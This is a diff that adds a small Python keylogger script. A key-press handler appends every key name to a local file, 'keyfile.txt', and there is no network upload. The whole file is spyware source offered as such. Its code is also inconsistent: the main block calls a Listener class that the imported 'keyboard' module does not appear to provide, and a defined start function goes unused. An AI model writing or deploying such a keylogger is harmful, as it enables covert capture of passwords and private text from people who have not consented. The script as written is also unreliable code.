@@ -1,0 +1,24 @@
+import keyboard  # Corrected import statement
+import threading
+
+# Function to handle key press events
+def keyPressed(event):
+    try:
+        # Write the key to a log file
+        with open("keyfile.txt", 'a') as logkeys:
+            logkeys.write(f"{event.name}\n")  # Log the key name
+    except Exception as e:
+        print(f"Error logging key: {e}")
+
+# Function to start the keylogger
+def start_keylogger():
+    try:
+        keyboard.on_press(keyPressed)  # Register the key press handler
+        keyboard.wait()  # Wait indefinitely for key events
+    except Exception as e:
+        print(f"Error starting keylogger: {e}")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
